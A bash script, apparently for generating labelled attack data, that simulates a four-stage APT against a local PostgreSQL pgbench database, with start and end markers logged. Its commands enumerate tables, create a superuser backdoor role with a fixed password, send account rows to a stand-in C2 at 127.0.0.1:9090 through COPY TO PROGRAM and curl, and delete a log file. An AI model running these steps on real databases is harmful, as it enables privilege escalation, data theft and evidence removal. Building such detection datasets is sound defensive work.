#!/bin/bash
echo "Simulating Multi-Stage APT Attack..."

/dataset_workspace/logger.sh mark_attack "attack_multi_stage_apt" start

# Stage 1: DB-only unauthorized enumeration (Category 2 mapping)
echo "Stage 1: Database Enumeration"
psql -U postgres -d casce_tpcb -c "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';" > /dev/null
sleep 1

# Stage 2: Database Privilege Escalation
echo "Stage 2: Privilege Escalation"
psql -U postgres -d casce_tpcb -c "CREATE ROLE apt_hacker SUPERUSER LOGIN PASSWORD 'apt_pass';" > /dev/null 2>&1 || true
sleep 1

# Stage 3: Cross-layer payload delivery (curl to external C2)
echo "Stage 3: Payload Delivery via Network"
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';" > /dev/null 2>&1 || true
sleep 1

# Stage 4: OS-only Sabotage/Log disruption (Category 1 mapping)
echo "Stage 4: OS-only Log Deletion / Sabotage"
sh -c "rm -f /tmp/some_fake_log.log 2>/dev/null || true"

/dataset_workspace/logger.sh mark_attack "attack_multi_stage_apt" end

echo "Multi-stage APT simulated successfully."
